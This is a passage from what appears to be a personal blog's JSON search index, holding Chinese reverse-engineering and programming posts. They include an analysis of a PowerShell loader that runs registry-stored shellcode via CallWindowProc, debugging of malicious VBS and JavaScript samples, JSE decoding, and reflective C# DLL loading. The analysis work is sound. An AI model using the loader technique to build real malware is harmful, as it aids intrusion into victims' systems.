去掉所有的0x3F ,如下： 代码已经清晰可见了。 主要功能为 调用静态类Pernitr1的方法，分配内存，读取注册表中的shellcode到分配的内存，调用Pernitr1：：CallWindowProc 执行shellcode。调用静态类Pernitr1方法时，会启动csc.exe 编译形成一个C# DLL文件，然后调用。 shellcode 的分析较为困难，包含了反调试，反虚拟机的代码，目前还未分析完全，调试不崩的状态是 提取PS代码，用powershell打开，然后设置映像劫持OD，在CallWindowProcW 下断点。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"shell 语句编写 踩坑","slug":"编程/shell 语句编写 踩坑","date":"2022-03-02T16:00:00.000Z","updated":"2024-03-12T15:33:12.146Z","comments":true,"path":"2022/03/03/编程/shell 语句编写 踩坑/","link":"","permalink":"http://zwjsfdbb.top/2022/03/03/%E7%BC%96%E7%A8%8B/shell%20%E8%AF%AD%E5%8F%A5%E7%BC%96%E5%86%99%20%E8%B8%A9%E5%9D%91/","excerpt":"代码 变量赋值&#x3D;前后不能有空格 if 后面的[] 里面必须以空格间隔 notepad++ 编写的shell 文件 结尾会报错，更改格式DOS为unix #!/bin/bash if [ $# -ne 1 ]; then echo &quot;USAGE: $0 filepath &quot;else filepath=$1 filename=$&#123;filepath##*/&#125; echo &quot;/home/zhangwenjie1/backup/$filename&quot; scp $1 hdp-chdusrc@client62v.white.lycc.qihoo.net:/home/zhangwenjie1/backup/ &amp;&amp;ssh hdp-chdusrc@client62v.white.lycc.qihoo.net &quot;hadoop fs -copyFromLocal /home/zhangwenjie1/backup/$filename /home/hdp-chdusrc/zhangwenjie &amp;&amp; rm /home/zhangwenjie1/backup/$filename&quot; ; fi;","text":"代码 变量赋值&#x3D;前后不能有空格 if 后面的[] 里面必须以空格间隔 notepad++ 编写的shell 文件 结尾会报错，更改格式DOS为unix #!/bin/bash if [ $# -ne 1 ]; then echo &quot;USAGE: $0 filepath &quot;else filepath=$1 filename=$&#123;filepath##*/&#125; echo &quot;/home/zhangwenjie1/backup/$filename&quot; scp $1 hdp-chdusrc@client62v.white.lycc.qihoo.net:/home/zhangwenjie1/backup/ &amp;&amp;ssh hdp-chdusrc@client62v.white.lycc.qihoo.net &quot;hadoop fs -copyFromLocal /home/zhangwenjie1/backup/$filename /home/hdp-chdusrc/zhangwenjie &amp;&amp; rm /home/zhangwenjie1/backup/$filename&quot; ; fi;","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"C# 静态加载和动态加载DLL","slug":"编程/C#静态加载和动态加载DLL","date":"2022-02-27T16:00:00.000Z","updated":"2024-03-12T15:48:05.258Z","comments":true,"path":"2022/02/28/编程/C#静态加载和动态加载DLL/","link":"","permalink":"http://zwjsfdbb.top/2022/02/28/%E7%BC%96%E7%A8%8B/C#%E9%9D%99%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDDLL/","excerpt":"1、静态加载 &#96;&#96;using System; using System.Collections.Generic; using System.Linq; using System.Text; using System.Threading.Tasks; using System.Reflection;&#96; namespace ConsoleApplication1&#123; class Program &#123; static void Main(string[] args) &#123; Assembly assembly = Assembly.LoadFrom(&quot;C:\\\\12.dll&quot;); Type t = assembly.GetType(&quot;ClassLibrary1.Main&quot;); t.InvokeMember(&quot;Ylfwdwgmpilzyaph&quot;, BindingFlags.InvokeMethod, null, null, null); ​ ｝ ​ ｝ ｝ 2、动态加载 namespace ConsoleApplication1&#123; class Program &#123; static void Main(string[] args) &#123; Assembly assembly = Assembly.LoadFrom(&quot;C:\\\\12.dll&quot;); Type t = assembly.GetType(&quot;ClassLibrary1.Main&quot;); Object obj = System.Activator.CreateInstance(t); MethodInfo mi = t.GetMethod(&quot;Ylfwdwgmpilzyaph&quot;); mi.Invoke(obj, null); &#125; }&#125;","text":"1、静态加载 &#96;&#96;using System; using System.Collections.Generic; using System.Linq; using System.Text; using System.Threading.Tasks; using System.Reflection;&#96; namespace ConsoleApplication1&#123; class Program &#123; static void Main(string[] args) &#123; Assembly assembly = Assembly.LoadFrom(&quot;C:\\\\12.dll&quot;); Type t = assembly.GetType(&quot;ClassLibrary1.Main&quot;); t.InvokeMember(&quot;Ylfwdwgmpilzyaph&quot;, BindingFlags.InvokeMethod, null, null, null); ​ ｝ ​ ｝ ｝ 2、动态加载 namespace ConsoleApplication1&#123; class Program &#123; static void Main(string[] args) &#123; Assembly assembly = Assembly.LoadFrom(&quot;C:\\\\12.dll&quot;); Type t = assembly.GetType(&quot;ClassLibrary1.Main&quot;); Object obj = System.Activator.CreateInstance(t); MethodInfo mi = t.GetMethod(&quot;Ylfwdwgmpilzyaph&quot;); mi.Invoke(obj, null); &#125; }&#125;","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"调试VBS步骤记录","slug":"逆向/调试VBS步骤记录","date":"2021-12-15T16:00:00.000Z","updated":"2024-03-12T14:41:34.387Z","comments":true,"path":"2021/12/16/逆向/调试VBS步骤记录/","link":"","permalink":"http://zwjsfdbb.top/2021/12/16/%E9%80%86%E5%90%91/%E8%B0%83%E8%AF%95VBS%E6%AD%A5%E9%AA%A4%E8%AE%B0%E5%BD%95/","excerpt":"1、步骤记录 VBS来源于一个宏样本，释放了VBS并运行。 调试环境 Visual studio 2013 设置实时调试 windows +R 在运行框输入wscript &#x2F;x vbs文件路径，启动调试。 经常出现打开调试即运行，这时可以在脚本开头加入 MsgBox(“Hello world”) 以阻塞程序运行，然后下断点，再点击确定即可。","text":"1、步骤记录 VBS来源于一个宏样本，释放了VBS并运行。 调试环境 Visual studio 2013 设置实时调试 windows +R 在运行框输入wscript &#x2F;x vbs文件路径，启动调试。 经常出现打开调试即运行，这时可以在脚本开头加入 MsgBox(“Hello world”) 以阻塞程序运行，然后下断点，再点击确定即可。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"context结构","slug":"编程/context结构","date":"2021-12-01T16:00:00.000Z","updated":"2024-03-12T15:47:55.991Z","comments":true,"path":"2021/12/02/编程/context结构/","link":"","permalink":"http://zwjsfdbb.top/2021/12/02/%E7%BC%96%E7%A8%8B/context%E7%BB%93%E6%9E%84/","excerpt":"123456789101112131415161718192021222324252627282930313233343536CONTEXT（线程结构体）typedef struct _CONTEXT&#123; DWORD ContextFlags // -| +00h DWORD Dr0 // | +04h DWORD Dr1 // | +08h DWORD Dr2 // &gt;调试寄存器 +0Ch DWORD Dr3 // | +10h DWORD Dr6 // | +14h DWORD Dr7 // -| +18h FLOATING_SAVE_AREA FloatSave; //浮点寄存器区 +1Ch~~~88h DWORD SegGs //-| +8Ch DWORD SegFs // |\\段寄存器 +90h DWORD SegEs // |/ +94h DWORD SegDs //-| +98h DWORD Edi //________ +9Ch DWORD Esi // | 通用 +A0h DWORD Ebx // | 寄 +A4h DWORD Edx // | 存 +A8h DWORD Ecx // | 器 +ACh DWORD Eax //_|___组_ +B0h DWORD Ebp //++++++ +B4h DWORD Eip // |控制 +B8h DWORD SegCs // |寄存 +BCh DWORD EFlag // |器组 +C0h DWORD Esp // | +C4h DWORD SegSs //++++++ +C8h BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];&#125; CONTEXT; typedef CONTEXT *PCONTEXT; #define MAXIMUM_SUPPORTED_EXTENSION 512","text":"123456789101112131415161718192021222324252627282930313233343536CONTEXT（线程结构体）typedef struct _CONTEXT&#123; DWORD ContextFlags // -| +00h DWORD Dr0 // | +04h DWORD Dr1 // | +08h DWORD Dr2 // &gt;调试寄存器 +0Ch DWORD Dr3 // | +10h DWORD Dr6 // | +14h DWORD Dr7 // -| +18h FLOATING_SAVE_AREA FloatSave; //浮点寄存器区 +1Ch~~~88h DWORD SegGs //-| +8Ch DWORD SegFs // |\\段寄存器 +90h DWORD SegEs // |/ +94h DWORD SegDs //-| +98h DWORD Edi //________ +9Ch DWORD Esi // | 通用 +A0h DWORD Ebx // | 寄 +A4h DWORD Edx // | 存 +A8h DWORD Ecx // | 器 +ACh DWORD Eax //_|___组_ +B0h DWORD Ebp //++++++ +B4h DWORD Eip // |控制 +B8h DWORD SegCs // |寄存 +BCh DWORD EFlag // |器组 +C0h DWORD Esp // | +C4h DWORD SegSs //++++++ +C8h BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];&#125; CONTEXT; typedef CONTEXT *PCONTEXT; #define MAXIMUM_SUPPORTED_EXTENSION 512","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"JSE -VBE 转JS VB工具","slug":"逆向/JSE -VBE 转JS VB工具","date":"2021-11-24T16:00:00.000Z","updated":"2024-03-12T15:03:14.843Z","comments":true,"path":"2021/11/25/逆向/JSE -VBE 转JS VB工具/","link":"","permalink":"http://zwjsfdbb.top/2021/11/25/%E9%80%86%E5%90%91/JSE%20-VBE%20%E8%BD%ACJS%20VB%E5%B7%A5%E5%85%B7/","excerpt":"1、JSE -VBE 转JS VB工具 工具链接 https://github.com/SanseoLab/ejExtractor JSE是JS经过编码后的类型，可直接通过Wscript.exe运行。为了将JSE转成JS原始代码，查找了不少工具，发现ejExtractor是最好用的。这个工具是一个集成工具箱，可反编译以下的类型的样本，其他的我还没有试过 AutoIt, AutoHotKey, InnoSetup, NSIS executables, MSI and JSE&#x2F;VBE, powershell Encoding&#x2F;Decoding 下面介绍使用方式： 该工具需要python2 才能运行，我的是python3 然后仔细分析了一下，发现其实是调用的Decide.vbs文件来执行的，因此可以直接用这个VBS脚本来解析，直接运行，显示如下结果，竟然失败，难道作者在扯淡。 带着疑问，我查找了一下相关报错的未知，发现 只有检测vbe 没得检测jse的未知，这个脚本还是有点缺陷哈。 将脚本更改如下：","text":"1、JSE -VBE 转JS VB工具 工具链接 https://github.com/SanseoLab/ejExtractor JSE是JS经过编码后的类型，可直接通过Wscript.exe运行。为了将JSE转成JS原始代码，查找了不少工具，发现ejExtractor是最好用的。这个工具是一个集成工具箱，可反编译以下的类型的样本，其他的我还没有试过 AutoIt, AutoHotKey, InnoSetup, NSIS executables, MSI and JSE&#x2F;VBE, powershell Encoding&#x2F;Decoding 下面介绍使用方式： 该工具需要python2 才能运行，我的是python3 然后仔细分析了一下，发现其实是调用的Decide.vbs文件来执行的，因此可以直接用这个VBS脚本来解析，直接运行，显示如下结果，竟然失败，难道作者在扯淡。 带着疑问，我查找了一下相关报错的未知，发现 只有检测vbe 没得检测jse的未知，这个脚本还是有点缺陷哈。 将脚本更改如下： 接着运行，发现又爆出了新的错，如下 这是注释影响了解码，删除注释的字符，连空格都不能多，不然也会失败。 解码非常慢，需要等待一段时间，经过七七四十九天，得到了test.jss，如下。 虽然依旧难读，但是至少是你认识的代码了，至此工具的使命完成，接下来就是去混淆的过程，下次再会。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"javascript 病毒分析","slug":"逆向/JavaScript病毒分析","date":"2021-11-16T16:00:00.000Z","updated":"2024-03-12T15:04:01.643Z","comments":true,"path":"2021/11/17/逆向/JavaScript病毒分析/","link":"","permalink":"http://zwjsfdbb.top/2021/11/17/%E9%80%86%E5%90%91/JavaScript%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/","excerpt":"1 初始分析javascript样本来源于一个exe文件，该文件是通过NSIS打包而成，释放了javascript文件，拿到javascript文件，无论我用什么编辑器打开都是这个样子： 非常奇怪，最后我用Cerbero.Suite工具打开，发现神奇的被解析了， 好评好评，推荐这个工具，可以用来解析一些神奇的格式文件，针对包含了宏代码的office文件特别有用。 2 调试分析采用visual studio 进行脚本调试，设置如下 随后win+R 运行，即可调出visual studio的调试界面。","text":"1 初始分析javascript样本来源于一个exe文件，该文件是通过NSIS打包而成，释放了javascript文件，拿到javascript文件，无论我用什么编辑器打开都是这个样子： 非常奇怪，最后我用Cerbero.Suite工具打开，发现神奇的被解析了， 好评好评，推荐这个工具，可以用来解析一些神奇的格式文件，针对包含了宏代码的office文件特别有用。 2 调试分析采用visual studio 进行脚本调试，设置如下 随后win+R 运行，即可调出visual studio的调试界面。 非常神奇的是，初始的代码是这样的： visual studio 解析后变成了这样，可读性就非常高了。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"ubuntu 无法安装软件","slug":"杂学/ubuntu 无法安装软件","date":"2018-04-11T16:00:00.000Z","updated":"2024-03-12T10:09:46.019Z","comments":true,"path":"2018/04/12/杂学/ubuntu 无法安装软件/","link":"","permalink":"http://zwjsfdbb.top/2018/04/12/%E6%9D%82%E5%AD%A6/ubuntu%20%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6/","excerpt":"问题描述apt-get install package 时出现以下问题 E: Could not get lock &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock - open (11: Resource temporarily unavailable)E: Unable to lock the administration directory (&#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;), is another process using it? 解决办法： sudo rm &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock sudo dpkg –configure -a","text":"问题描述apt-get install package 时出现以下问题 E: Could not get lock &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock - open (11: Resource temporarily unavailable)E: Unable to lock the administration directory (&#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;), is another process using it? 解决办法： sudo rm &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock sudo dpkg –configure -a","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"windows 更新以后无法定位msvcp_win.dll","slug":"杂学/windows 更新以后无法定位msvcp_win.dll","date":"2018-04-11T16:00:00.000Z","updated":"2024-03-12T10:10:07.749Z","comments":true,"path":"2018/04/12/杂学/windows 更新以后无法定位msvcp_win.dll/","link":"","permalink":"http://zwjsfdbb.top/2018/04/12/%E6%9D%82%E5%AD%A6/windows%20%E6%9B%B4%E6%96%B0%E4%BB%A5%E5%90%8E%E6%97%A0%E6%B3%95%E5%AE%9A%E4%BD%8Dmsvcp_win.dll/","excerpt":"问题描述：win10更新以后出现 无法定位程序输入点_uncaught_exceptions 于动态链接库 C:\\windows\\system32\\msvcp_win.dll上。 解决办法：命令行下：输入sfc &#x2F;scannow","text":"问题描述：win10更新以后出现 无法定位程序输入点_uncaught_exceptions 于动态链接库 C:\\windows\\system32\\msvcp_win.dll上。 解决办法：命令行下：输入sfc &#x2F;scannow","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"windows 编程获取网卡和ip","slug":"编程/windows 编程获取网卡和ip","date":"2018-04-11T16:00:00.000Z","updated":"2024-03-12T11:13:37.634Z","comments":true,"path":"2018/04/12/编程/windows 编程获取网卡和ip/","link":"","permalink":"http://zwjsfdbb.top/2018/04/12/%E7%BC%96%E7%A8%8B/windows%20%E7%BC%96%E7%A8%8B%E8%8E%B7%E5%8F%96%E7%BD%91%E5%8D%A1%E5%92%8Cip/","excerpt":"一台机器上可能不只有一个网卡，但每一个网卡只有一个MAC地址，而每一个网卡可能配置有多个IP地址；如平常的笔记本电脑中，就会有无线网卡和有线网卡（网线接口）两种；因此，如果要获得本机所有网卡的IP和MAC地址信息，则必须顺序获得每个网卡，再依次获取其信息等；在windows sdk中，用IP_ADAPTER_INFO结构体存储网卡信息，包括网卡名、网卡描述、网卡MAC地址、网卡IP等，该结构体的主要描述如下所示： typedef struct _IP_ADAPTER_INFO &#123; struct _IP_ADAPTER_INFO* Next;//指向链表中下一个适配器信息的指针 DWORD ComboIndex;//预留值 char AdapterName[MAX_ADAPTER_NAME_LENGTH + 4];//使用ANSI字符串表示的适配器名称 char Description[MAX_ADAPTER_DESCRIPTION_LENGTH + 4];//使用ANSI字符串表示的适配器描述 UINT AddressLength;//适配器硬件地址以字节计算的长度 BYTE Address[MAX_ADAPTER_ADDRESS_LENGTH];//硬件地址以BYTE数组所表示 DWORD Index;//适配器索引 UINT Type;//适配器类型,主要有以下几种： /* * MIB_IF_TYPE_OTHER 1 * MIB_IF_TYPE_ETHERNET 6 * MIB_IF_TYPE_TOKENRING 9 * MIB_IF_TYPE_FDDI 15 * MIB_IF_TYPE_PPP 23 * MIB_IF_TYPE_LOOPBACK 24 * MIB_IF_TYPE_SLIP 28 */ UINT DhcpEnabled;//指定这个适配器是否开启DHCP PIP_ADDR_STRING CurrentIpAddress;//预留值 IP_ADDR_STRING IpAddressList;//该适配器的IPv4地址链表 IP_ADDR_STRING GatewayList;//该适配器的网关IPv4地址链表 IP_ADDR_STRING DhcpServer;//该适配器的DHCP服务器的IPv4 地址链表 BOOL HaveWins; IP_ADDR_STRING PrimaryWinsServer; IP_ADDR_STRING SecondaryWinsServer; time_t LeaseObtained; time_t LeaseExpires; &#125; IP_ADAPTER_INFO,*PIP_ADAPTER_INFO; 由于可能有多个网卡，因此struct _IP_ADAPTER_INFO* Next字段为一个链表结构指针，由于一个网卡可能有多个IP，因此IP_ADDR_STRING字段应该也是一个链表结构，其信息如下所示： typedef struct _IP_ADDR_STRING &#123; struct _IP_ADDR_STRING* Next; //指向同类型节点，即下一个IP（如果有多IP的话） IP_ADDRESS_STRING IpAddress; //IP地址信息 IP_MASK_STRING IpMask; //IP子网掩码 DWORD Context;// 网络表入口。这个值对应着AddIPAddredd和DeleteIPAddress函数中的NTEContext参数 &#125; IP_ADDR_STRING; 在基本了解以上信息后，就可以调用GetAdaptersInfo函数来获取相关网卡信息了，其通用的代码如下所示： #include &lt;WinSock2.h&gt; #include &lt;Iphlpapi.h&gt; #include &lt;iostream&gt; using namespace std; #pragma comment(lib,&quot;Iphlpapi.lib&quot;) //需要添加Iphlpapi.lib库 int main(int argc, char* argv[]) &#123; //PIP_ADAPTER_INFO结构体指针存储本机网卡信息 PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO(); //得到结构体大小,用于GetAdaptersInfo参数 unsigned long stSize = sizeof(IP_ADAPTER_INFO); //调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量 int nRel = GetAdaptersInfo(pIpAdapterInfo,&amp;stSize); //记录网卡数量 int netCardNum = 0; //记录每张网卡上的IP地址数量 int IPnumPerNetCard = 0; if (ERROR_BUFFER_OVERFLOW == nRel) &#123; //如果函数返回的是ERROR_BUFFER_OVERFLOW //则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小 //这也是说明为什么stSize既是一个输入量也是一个输出量 //释放原来的内存空间 delete pIpAdapterInfo; //重新申请内存空间用来存储所有网卡信息 pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize]; //再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量 nRel=GetAdaptersInfo(pIpAdapterInfo,&amp;stSize); &#125; if (ERROR_SUCCESS == nRel) &#123; //输出网卡信息 //可能有多网卡,因此通过循环去判断 while (pIpAdapterInfo) &#123; cout&lt;&lt;&quot;网卡数量：&quot;&lt;&lt;++netCardNum&lt;&lt;endl; cout&lt;&lt;&quot;网卡名称：&quot;&lt;&lt;pIpAdapterInfo-&gt;AdapterName&lt;&lt;endl; cout&lt;&lt;&quot;网卡描述：&quot;&lt;&lt;pIpAdapterInfo-&gt;Description&lt;&lt;endl; switch(pIpAdapterInfo-&gt;Type) &#123; case MIB_IF_TYPE_OTHER: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;OTHER&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_ETHERNET: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;ETHERNET&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_TOKENRING: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;TOKENRING&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_FDDI: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;FDDI&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_PPP: printf(&quot;PP\\n&quot;); cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;PPP&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_LOOPBACK: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;LOOPBACK&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_SLIP: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;SLIP&quot;&lt;&lt;endl; break; default: break; &#125; cout&lt;&lt;&quot;网卡MAC地址：&quot;; for (DWORD i = 0; i &lt; pIpAdapterInfo-&gt;AddressLength; i++) if (i &lt; pIpAdapterInfo-&gt;AddressLength-1) &#123; printf(&quot;%02X-&quot;, pIpAdapterInfo-&gt;Address[i]); &#125; else &#123; printf(&quot;%02X\\n&quot;, pIpAdapterInfo-&gt;Address[i]); &#125; cout&lt;&lt;&quot;网卡IP地址如下：&quot;&lt;&lt;endl; //可能网卡有多IP,因此通过循环去判断 IP_ADDR_STRING *pIpAddrString =&amp;(pIpAdapterInfo-&gt;IpAddressList); do &#123; cout&lt;&lt;&quot;该网卡上的IP数量：&quot;&lt;&lt;++IPnumPerNetCard&lt;&lt;endl; cout&lt;&lt;&quot;IP 地址：&quot;&lt;&lt;pIpAddrString-&gt;IpAddress.String&lt;&lt;endl; cout&lt;&lt;&quot;子网地址：&quot;&lt;&lt;pIpAddrString-&gt;IpMask.String&lt;&lt;endl; cout&lt;&lt;&quot;网关地址：&quot;&lt;&lt;pIpAdapterInfo-&gt;GatewayList.IpAddress.String&lt;&lt;endl; pIpAddrString=pIpAddrString-&gt;Next; &#125; while (pIpAddrString); pIpAdapterInfo = pIpAdapterInfo-&gt;Next; cout&lt;&lt;&quot;--------------------------------------------------------------------&quot;&lt;&lt;endl; &#125; &#125; //释放内存空间 if (pIpAdapterInfo) &#123; delete pIpAdapterInfo; &#125; return 0; &#125;","text":"一台机器上可能不只有一个网卡，但每一个网卡只有一个MAC地址，而每一个网卡可能配置有多个IP地址；如平常的笔记本电脑中，就会有无线网卡和有线网卡（网线接口）两种；因此，如果要获得本机所有网卡的IP和MAC地址信息，则必须顺序获得每个网卡，再依次获取其信息等；在windows sdk中，用IP_ADAPTER_INFO结构体存储网卡信息，包括网卡名、网卡描述、网卡MAC地址、网卡IP等，该结构体的主要描述如下所示： typedef struct _IP_ADAPTER_INFO &#123; struct _IP_ADAPTER_INFO* Next;//指向链表中下一个适配器信息的指针 DWORD ComboIndex;//预留值 char AdapterName[MAX_ADAPTER_NAME_LENGTH + 4];//使用ANSI字符串表示的适配器名称 char Description[MAX_ADAPTER_DESCRIPTION_LENGTH + 4];//使用ANSI字符串表示的适配器描述 UINT AddressLength;//适配器硬件地址以字节计算的长度 BYTE Address[MAX_ADAPTER_ADDRESS_LENGTH];//硬件地址以BYTE数组所表示 DWORD Index;//适配器索引 UINT Type;//适配器类型,主要有以下几种： /* * MIB_IF_TYPE_OTHER 1 * MIB_IF_TYPE_ETHERNET 6 * MIB_IF_TYPE_TOKENRING 9 * MIB_IF_TYPE_FDDI 15 * MIB_IF_TYPE_PPP 23 * MIB_IF_TYPE_LOOPBACK 24 * MIB_IF_TYPE_SLIP 28 */ UINT DhcpEnabled;//指定这个适配器是否开启DHCP PIP_ADDR_STRING CurrentIpAddress;//预留值 IP_ADDR_STRING IpAddressList;//该适配器的IPv4地址链表 IP_ADDR_STRING GatewayList;//该适配器的网关IPv4地址链表 IP_ADDR_STRING DhcpServer;//该适配器的DHCP服务器的IPv4 地址链表 BOOL HaveWins; IP_ADDR_STRING PrimaryWinsServer; IP_ADDR_STRING SecondaryWinsServer; time_t LeaseObtained; time_t LeaseExpires; &#125; IP_ADAPTER_INFO,*PIP_ADAPTER_INFO; 由于可能有多个网卡，因此struct _IP_ADAPTER_INFO* Next字段为一个链表结构指针，由于一个网卡可能有多个IP，因此IP_ADDR_STRING字段应该也是一个链表结构，其信息如下所示： typedef struct _IP_ADDR_STRING &#123; struct _IP_ADDR_STRING* Next; //指向同类型节点，即下一个IP（如果有多IP的话） IP_ADDRESS_STRING IpAddress; //IP地址信息 IP_MASK_STRING IpMask; //IP子网掩码 DWORD Context;// 网络表入口。这个值对应着AddIPAddredd和DeleteIPAddress函数中的NTEContext参数 &#125; IP_ADDR_STRING; 在基本了解以上信息后，就可以调用GetAdaptersInfo函数来获取相关网卡信息了，其通用的代码如下所示： #include &lt;WinSock2.h&gt; #include &lt;Iphlpapi.h&gt; #include &lt;iostream&gt; using namespace std; #pragma comment(lib,&quot;Iphlpapi.lib&quot;) //需要添加Iphlpapi.lib库 int main(int argc, char* argv[]) &#123; //PIP_ADAPTER_INFO结构体指针存储本机网卡信息 PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO(); //得到结构体大小,用于GetAdaptersInfo参数 unsigned long stSize = sizeof(IP_ADAPTER_INFO); //调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量 int nRel = GetAdaptersInfo(pIpAdapterInfo,&amp;stSize); //记录网卡数量 int netCardNum = 0; //记录每张网卡上的IP地址数量 int IPnumPerNetCard = 0; if (ERROR_BUFFER_OVERFLOW == nRel) &#123; //如果函数返回的是ERROR_BUFFER_OVERFLOW //则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小 //这也是说明为什么stSize既是一个输入量也是一个输出量 //释放原来的内存空间 delete pIpAdapterInfo; //重新申请内存空间用来存储所有网卡信息 pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize]; //再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量 nRel=GetAdaptersInfo(pIpAdapterInfo,&amp;stSize); &#125; if (ERROR_SUCCESS == nRel) &#123; //输出网卡信息 //可能有多网卡,因此通过循环去判断 while (pIpAdapterInfo) &#123; cout&lt;&lt;&quot;网卡数量：&quot;&lt;&lt;++netCardNum&lt;&lt;endl; cout&lt;&lt;&quot;网卡名称：&quot;&lt;&lt;pIpAdapterInfo-&gt;AdapterName&lt;&lt;endl; cout&lt;&lt;&quot;网卡描述：&quot;&lt;&lt;pIpAdapterInfo-&gt;Description&lt;&lt;endl; switch(pIpAdapterInfo-&gt;Type) &#123; case MIB_IF_TYPE_OTHER: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;OTHER&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_ETHERNET: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;ETHERNET&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_TOKENRING: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;TOKENRING&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_FDDI: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;FDDI&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_PPP: printf(&quot;PP\\n&quot;); cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;PPP&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_LOOPBACK: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;LOOPBACK&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_SLIP: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;SLIP&quot;&lt;&lt;endl; break; default: break; &#125; cout&lt;&lt;&quot;网卡MAC地址：&quot;; for (DWORD i = 0; i &lt; pIpAdapterInfo-&gt;AddressLength; i++) if (i &lt; pIpAdapterInfo-&gt;AddressLength-1) &#123; printf(&quot;%02X-&quot;, pIpAdapterInfo-&gt;Address[i]); &#125; else &#123; printf(&quot;%02X\\n&quot;, pIpAdapterInfo-&gt;Address[i]); &#125; cout&lt;&lt;&quot;网卡IP地址如下：&quot;&lt;&lt;endl; //可能网卡有多IP,因此通过循环去判断 IP_ADDR_STRING *pIpAddrString =&amp;(pIpAdapterInfo-&gt;IpAddressList); do &#123; cout&lt;&lt;&quot;该网卡上的IP数量：&quot;&lt;&lt;++IPnumPerNetCard&lt;&lt;endl; cout&lt;&lt;&quot;IP 地址：&quot;&lt;&lt;pIpAddrString-&gt;IpAddress.String&lt;&lt;endl; 